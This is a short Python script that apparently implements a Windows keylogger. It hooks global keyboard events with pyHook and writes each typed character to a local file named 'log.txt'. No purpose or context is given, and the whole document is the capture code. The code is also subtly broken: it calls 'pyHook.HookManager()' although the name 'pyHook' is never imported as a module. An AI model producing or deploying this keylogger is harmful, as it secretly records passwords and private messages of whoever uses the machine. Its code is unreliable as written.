from pyHook import *
from pyHook import HookManager

import pythoncom, sys, logging
 
file_log='log.txt'
 
def onKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
 
hooks_manager = pyHook.HookManager()

 
hooks_manager.KeyDown=onKeyboardEvent
 
hooks_manager.HookKeyboard()
 
pythoncom.PumpMessages()
